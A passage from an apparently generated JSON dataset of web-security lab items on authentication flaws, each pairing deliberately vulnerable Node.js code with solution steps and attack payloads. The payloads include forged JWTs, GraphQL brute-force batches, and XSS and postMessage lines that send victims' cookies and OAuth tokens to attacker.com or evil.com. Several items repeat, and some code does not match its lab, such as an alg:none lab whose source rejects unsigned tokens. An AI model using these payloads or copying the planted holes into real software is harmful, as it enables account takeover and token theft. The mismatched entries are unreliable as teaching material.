      "{\"token\":\"eyJhbGciOiJIUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsIm4iOi...\"}",
      "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through misconfigured CORS",
    "Lab Description": "The OAuth token endpoint has overly permissive CORS headers, allowing token theft from malicious sites. The application [exposes access tokens through CORS-enabled responses without proper origin validation]. To solve: [craft a cross-domain request to steal OAuth tokens and use them to access protected resources].",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify permissive CORS headers on /oauth/token endpoint using OWASP ZAP",
      "Create malicious HTML page with XMLHttpRequest to token endpoint",
      "Trick authenticated user into visiting malicious page",
      "Capture leaked token in server logs or through exfiltration",
      "Use stolen token to access user data through API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\n\napp.use(cors({\n  origin: '*',\n  methods: ['GET','POST'],\n  allowedHeaders: ['Content-Type','Authorization'],\n  exposedHeaders: ['Access-Token']\n}));\n\napp.post('/oauth/token', (req, res) => {\n  res.json({\n    access_token: 'sensitive-token-value',\n    token_type: 'bearer'\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://vulnerable.com/oauth/token', true);\n  xhr.withCredentials = true;\n  xhr.onload = function() { exfiltrate(xhr.responseText); };\n  xhr.send('grant_type=client_credentials');\n</script>",
      "fetch('https://vulnerable.com/oauth/token', {\n  method: 'POST',\n  credentials: 'include',\n  body: 'grant_type=password&username=admin&password=123'\n}).then(r => r.json()).then(data => sendToAttacker(data));",
      "var iframe = document.createElement('iframe');\niframe.src = 'https://vulnerable.com/oauth/token?grant_type=implicit';\ndocument.body.appendChild(iframe);"
    ]
  },
  {
    "Lab scenario": "Session fixation through HTTP/2 header compression",
    "Lab Description": "The application's HTTP/2 implementation leaks session IDs through header compression side channels. The application [assigns session IDs before authentication and maintains them through HPACK compression contexts]. To solve: [analyze HPACK compression ratios to fixate and hijack privileged sessions].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic using Wireshark with SSL key logging",
      "Analyze HPACK header tables for session ID patterns",
      "Fixate session ID by reusing compression contexts",
      "Brute-force session IDs through compression ratio analysis",
      "Hijack valid session by matching compression characteristics"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nserver.on('stream', (stream, headers) => {\n  let sessionId = headers['session-id'] || Math.random().toString(36).substring(2);\n  \n  stream.respond({\n    ':status': 200,\n    'set-cookie': `SESSION=${sessionId}`,\n    'content-type': 'text/html'\n  });\n  \n  stream.end('<html>Logged in with session: '+sessionId+'</html>');\n});\n\nserver.listen(443);",
    "payloads": [
      "GET / HTTP/2\nHost: vulnerable.com\nsession-id: fixed-session-123\n\n",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\nHEADERS\n:method: GET\n:path: /\n:scheme: https\nsession-id: brute-force-payload\n",
      "HTTP/2 200 OK\ncontent-type: text/html\nset-cookie: SESSION=injected-session\n\n<html>...</html>"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's JWT-based authentication fails to validate the algorithm properly. The application accepts unsigned tokens when the 'alg' header is set to 'none'. To solve: craft a modified JWT to gain admin access without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
      "Decode the JWT structure using jwt.io or Burp Decoder",
      "Modify the algorithm header to 'none' and change the role claim to 'admin'",
      "Remove the signature portion (set to empty string after the last dot)",
      "Send the modified token in Authorization header to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET, { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (decoded?.header?.alg === 'none') {\n        if (decoded.payload.role === 'admin') {\n          res.send('Admin dashboard');\n          return;\n        }\n      }\n      res.status(401).send('Invalid token');\n    } catch {\n      res.status(401).send('Invalid token');\n    }\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The OAuth implementation leaks authorization codes through URL fragments in single-page applications. The application fails to validate the redirect_uri properly. To solve: intercept the OAuth flow and steal the victim's token through an open redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth authorization request",
      "Modify the redirect_uri parameter to point to attacker-controlled domain",
      "Set up a web server to capture incoming OAuth callbacks",
      "Craft malicious link with poisoned redirect_uri and social engineer victim",
      "Extract authorization code from callback URL and exchange for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {'client1': {secret: 's3cr3t', redirectURIs: ['https://legit.com/callback']}};\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  const authCode = 'random_code_' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id]?.secret === client_secret) {\n    res.json({access_token: 'fake_token', token_type: 'Bearer'});\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.listen(3001);",
    "payloads": [
      "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&redirect_uri=https://attacker.com/capture&state=123",
      "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&redirect_uri=https://evil.com/steal#&state=xyz"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack against authentication rate limiting",
    "Lab Description": "The GraphQL endpoint processes batched queries without proper rate limiting checks. The application fails to count each authentication attempt separately in a batch. To solve: bypass login attempt restrictions using query batching to brute-force credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture normal login attempt using Postman with GraphQL content-type",
      "Craft batch query with 100+ login attempts in single request",
      "Use Python script to generate permutations of common passwords",
      "Monitor responses for differing status codes indicating success",
      "Extract valid credentials from successful attempt response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`);\nconst root = {\n  login: ({username, password}) => {\n    if (username === 'admin' && password === 'SuperSecret123!') {\n      return true;\n    }\n    return false;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess1\\\") }\",\"variables\":{}},{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess2\\\") }\",\"variables\":{}}]",
      "{\"query\":\"mutation { attempt1: login(username: \\\"admin\\\", password: \\\"pass1\\\") attempt2: login(username: \\\"admin\\\", password: \\\"pass2\\\") attempt3: login(username: \\\"admin\\\", password: \\\"pass3\\\") }\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in OAuth callback handler",
    "Lab Description": "The OAuth implementation suffers from session fixation combined with DOM-based XSS in the callback handler. The application fails to regenerate session tokens after OAuth flow completion. To solve: chain XSS with session fixation to hijack an admin session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to identify XSS in the redirect_uri parameter of /oauth/callback",
      "Craft malicious link with XSS payload that extracts session cookies",
      "Fixate session by forcing victim to authenticate via your malicious OAuth state",
      "Trigger the XSS payload after victim completes OAuth flow",
      "Capture admin session token from your attacker server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\napp.use(require('cookie-parser')());\n\nconst sessions = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state, redirect_uri} = req.query;\n  if (!validateOAuthCode(code)) return res.status(400).send('Invalid code');\n  \n  const sessionId = req.cookies.session || state;\n  sessions[sessionId] = {user: 'admin'};\n  \n  res.cookie('session', sessionId);\n  res.send(`<script>window.location='${redirect_uri}'</script>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/callback?code=123&state=attacker_session&redirect_uri=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
      "https://victim.com/oauth/callback?code=123&state=fixed_session&redirect_uri=data:text/html,<script>location.href='https://attacker.com/?cookie='+document.cookie</script>"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT verification uses the kid header to load verification keys without proper sanitization. The application allows directory traversal in key file paths. To solve: craft a JWT signed with a predictable local file's contents to gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and note kid header usage",
      "Identify predictable key file locations (/dev/null, /proc/self/environ)",
      "Craft JWT with kid pointing to /dev/null and alg set to HS256",
      "Sign token with empty string (contents of /dev/null)",
      "Replace original token with forged one in Authorization header"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      fs.readFile(`./keys/${header.kid}`, (err, key) => {\n        callback(null, key || 'default_key');\n      });\n    });\n    if (decoded.role === 'admin') res.send('Admin access granted');\n    else res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3001);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJyb2xlIjoiYWRtaW4ifQ.dfeqg_9ZQ8t4bFJk7P3X7yZ1lT4nY7Xv8t8Qe3q9j0M",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1yB3L7L9eF3N9Q7YJ1kP5rT7wV9xZ2C4bD6fV8j0H"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication suffers from a race condition where the verification state isn't properly synchronized. The application uses a global variable to track MFA status. To solve: send parallel requests to bypass MFA by winning the race condition.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to capture normal MFA verification flow",
      "Create multiple concurrent requests to /verify-mfa endpoint",
      "Use Burp Turbo Intruder to send 100+ parallel requests",
      "Monitor for successful login despite invalid codes",
      "Access protected resource with session from winning request"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaVerified = false;\n\napp.post('/verify-mfa', (req, res) => {\n  const {code} = req.body;\n  if (code === '123456') {\n    mfaVerified = true;\n    res.send('Verified');\n  } else {\n    mfaVerified = false;\n    res.status(403).send('Invalid code');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (mfaVerified) {\n    res.send('Sensitive data');\n    mfaVerified = false;\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\n\napp.listen(3002);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"111111\"}",
      "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"000000\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external URLs. The application fails to validate the jku domain. To solve: host a malicious JWKS file and craft a JWT that forces the server to use your public key for verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and observe jku header usage",
      "Set up attacker-controlled server hosting JWKS with your public key",
      "Craft JWT with modified payload and jku pointing to your server",
      "Sign the token with your private key matching the JWKS",
      "Submit forged token to bypass authentication as admin"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    const jku = decoded?.header?.jku;\n    if (jku) {\n      const {data: jwks} = await axios.get(jku);\n      const key = jwks.keys[0].x5c[0];\n      jwt.verify(token, key);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsd2FyZS5qa3MifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5zaXRlL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure custom URI scheme",
    "Lab Description": "The mobile OAuth implementation uses insecure custom URI schemes for redirects, allowing token interception. The application fails to validate redirect URIs properly. To solve: register a malicious URI handler and intercept tokens from deep links.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept OAuth flow from mobile client",
      "Identify custom URI scheme (app://oauth-callback)",
      "Register malicious URI handler on attacker device",
      "Modify redirect_uri to use custom scheme with attacker domain",
      "Capture OAuth tokens when victim authenticates"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'mobileApp': {\n    secret: 'client_secret',\n    redirectURIs: ['app://oauth-callback', 'https://legit.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]?.redirectURIs.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  res.redirect(`${redirect_uri}#access_token=fake_token&state=${state}`);\n});\n\napp.listen(3001);",
    "payloads": [
      "https://oauth-server.com/oauth/authorize?response_type=token&client_id=mobileApp&redirect_uri=app://evil.com&state=123",
      "https://oauth-server.com/oauth/authorize?response_type=code&client_id=mobileApp&redirect_uri=app://attacker/steal&state=xyz"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket authentication handshake",
    "Lab Description": "The WebSocket upgrade process accepts existing session IDs without regeneration. The application authenticates WebSocket connections using cookies without proper session rotation. To solve: fixate session via HTTP then upgrade to WebSocket with same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture WebSocket handshake process",
      "Fixate session ID by setting cookie in initial HTTP request",
      "Initiate WebSocket connection using same session cookie",
      "Bypass authentication by reusing fixated session",
      "Access privileged WebSocket channels"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {authenticated: false};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].authenticated = true;\n  res.send('Logged in');\n});\n\nconst server = app.listen(3002);\nconst wss = new WebSocket.Server({server});\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1];\n  if (sessions[sessionId]?.authenticated) {\n    ws.send('Privileged WebSocket access granted');\n  } else {\n    ws.close();\n  }\n});",
    "payloads": [
      "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
      "GET /ws HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "JWT role escalation via nested token injection",
    "Lab Description": "The JWT implementation improperly processes nested JSON structures in token claims. The application fails to properly sanitize nested objects in the JWT payload. To solve: craft a JWT with nested role objects to escalate privileges to admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode its structure",
      "Identify role claim processing in backend code via error messages",
      "Craft JWT with nested role object: {'role': {'name': 'admin'}}",
      "Sign the modified token using the same algorithm (HS256)",
      "Submit forged token to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'weak_secret_key');\n    const role = decoded.role?.name || decoded.role;\n    if (role === 'admin') {\n      res.send('Admin dashboard accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6eyJuYW1lIjoiYWRtaW4ifX0.fake_signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjp7ImFjY2VzcyI6ImFkbWluIn19.invalid_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via state parameter reflection",
    "Lab Description": "The OAuth implementation reflects the state parameter without validation in the redirect URL. The application fails to maintain state server-side. To solve: craft a malicious link that captures victim's OAuth tokens via reflected state.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to analyze OAuth flow and state parameter usage",
      "Construct malicious URL with state parameter containing XSS payload",
      "Social engineer victim to click the link and authenticate",
      "Capture OAuth tokens when victim is redirected to attacker's site",
      "Use stolen tokens to impersonate victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  res.redirect(`${state}#access_token=fake_token&code=${code}`);\n});\n\napp.listen(3001);",
    "payloads": [
      "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&state=https://attacker.com/steal",
      "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&state=javascript:fetch('https://attacker.com/log?token='+document.location.hash)"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL WebSocket connection",
    "Lab Description": "The GraphQL subscription endpoint accepts existing session cookies for WebSocket connections without regeneration. The application fails to rotate session identifiers during WebSocket upgrade. To solve: fixate session via HTTP then establish GraphQL subscription with same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture GraphQL WebSocket handshake",
      "Fixate session ID by setting cookie in initial HTTP request",
      "Initiate GraphQL WebSocket connection using same session cookie",
      "Subscribe to privileged data streams using fixated session",
      "Exfiltrate sensitive data via subscription channel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {user: 'guest'};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].user = 'admin';\n  res.send('Logged in');\n});\n\nconst server = createServer(app);\n\nSubscriptionServer.create(\n  {\n    execute,\n    subscribe,\n    onConnect: (connectionParams, websocket) => {\n      const sessionId = websocket.upgradeReq.headers.cookie?.match(/session=([^;]+)/)?.[1];\n      return {session: sessions[sessionId]};\n    }\n  },\n  {server}\n);\n\nserver.listen(3002);",
    "payloads": [
      "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
      "CONNECT /graphql HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via x5u header injection",
    "Lab Description": "The JWT implementation trusts x5u header to fetch verification certificates without proper validation. The application fails to verify the certificate chain when switching from HMAC to RSA. To solve: host a malicious certificate and force the server to verify tokens using your public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Generate RSA key pair and self-signed certificate",
      "Host malicious certificate at attacker-controlled domain",
      "Craft JWT with x5u pointing to your certificate and alg set to RS256",
      "Sign token with your private key and submit to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    if (decoded.header.x5u) {\n      const {data: cert} = await axios.get(decoded.header.x5u);\n      jwt.verify(token, cert);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXJ0In0.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5zaXRlL2NlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure postMessage handler",
    "Lab Description": "The OAuth popup implementation uses postMessage without proper origin validation. The application fails to verify the message source when processing OAuth tokens. To solve: craft a malicious page that intercepts tokens via postMessage event listeners.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to analyze OAuth flow in popup window",
      "Create malicious HTML page with postMessage event listener",
      "Social engineer victim to open your page after initiating OAuth",
      "Capture OAuth tokens when they're posted to your window",
      "Use stolen tokens to impersonate victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code} = req.query;\n  res.send(`<script>\n    window.opener.postMessage({oauth_token: '${code}'}, '*');\n    window.close();\n  </script>`);\n});\n\napp.listen(3001);",
    "payloads": [
      "<iframe src=\"https://oauth-server.com/oauth/authorize?response_type=token&client_id=victim\"></iframe>\n<script>window.addEventListener('message',e=>{fetch('https://attacker.com/steal?token='+e.data.oauth_token)})</script>",
      "<script>window.open('https://oauth-server.com/oauth/authorize?response_type=code&client_id=victim','oauth','width=500,height=600');\nwindow.addEventListener('message',e=>{document.location='https://attacker.com/exfil?data='+btoa(JSON.stringify(e.data))})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 Server Push headers",
    "Lab Description": "The HTTP/2 implementation pushes session cookies without proper validation. The application assigns session IDs during resource push before authentication. To solve: intercept HTTP/2 push stream to fixate session then authenticate with known credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite with HTTP/2 support to intercept traffic",
      "Analyze Server Push frames for early Set-Cookie headers",
      "Capture and reuse pushed session ID before authentication",
      "Authenticate with valid credentials using fixated session",
      "Access privileged resources with established session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst spdy = require('spdy');\nconst app = express();\n\napp.use((req, res, next) => {\n  if (!req.cookies.session) {\n    res.set('Link', '</styles.css>; rel=preload; as=style');\n    res.cookie('session', Math.random().toString(36).substring(2));\n  }\n  next();\n});\n\napp.post('/login', (req, res) => {\n  if (req.body.user === 'admin' && req.body.pass === 'S3cr3t!') {\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\nconst server = spdy.createServer({}, app);\nserver.listen(3002, () => {\n  console.log('HTTP/2 server running');\n});",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=S3cr3t!"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "This lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
      "Decode the token using jwt.io or Burp's Decoder to analyze its structure",
      "Modify the algorithm header to 'none' and remove the signature section",
      "Change the 'role' claim from 'user' to 'admin' in the payload",
      "Send the modified token in the Authorization header to access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'admin123', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secretkey', { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTU5MjIwODB9."
    ]
  },
  {
    "Lab scenario": "GraphQL query abuse in user profile API",
    "Lab Description": "This lab's GraphQL endpoint exposes sensitive user information through introspection and lacks proper rate limiting. The application allows unlimited query depth that can lead to data leakage. To solve: extract all user credentials through a crafted GraphQL query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send introspection queries to discover the GraphQL schema",
      "Identify sensitive fields in the User type through schema analysis",
      "Craft a recursive query to fetch all user data in a single request",
      "Use query batching to bypass rate limiting by sending multiple queries in one request",
      "Extract password hashes and crack them using John the Ripper"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    passwordHash: String!\n    isAdmin: Boolean!\n  }\n  \n  type Query {\n    users: [User]\n    user(id: ID!): User\n  }\n`);\n\nconst root = {\n  users: () => db.getUsers(),\n  user: ({id}) => db.getUserById(id)\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
    "payloads": [
      "query { users { username passwordHash } }",
      "query { __schema { types { name fields { name } } } }",
      "[{\"query\":\"query { user(id: 1) { username passwordHash } }\"}, {\"query\":\"query { user(id: 2) { username passwordHash } }\"}]"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through open redirect",
    "Lab Description": "This lab's OAuth implementation is vulnerable to token leakage through an open redirect in the callback URL. The application fails to validate redirect URIs properly. To solve: steal an OAuth token by tricking a user into visiting a malicious link.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the OAuth authorization endpoint and required parameters",
      "Craft a malicious callback URL pointing to your attacker server",
      "Use social engineering to make the victim visit the crafted URL",
      "Intercept the OAuth token in the redirect using Burp Collaborator",
      "Exchange the authorization code for an access token and access victim resources"
    ],
    "Vulnerability name": "Authentication",
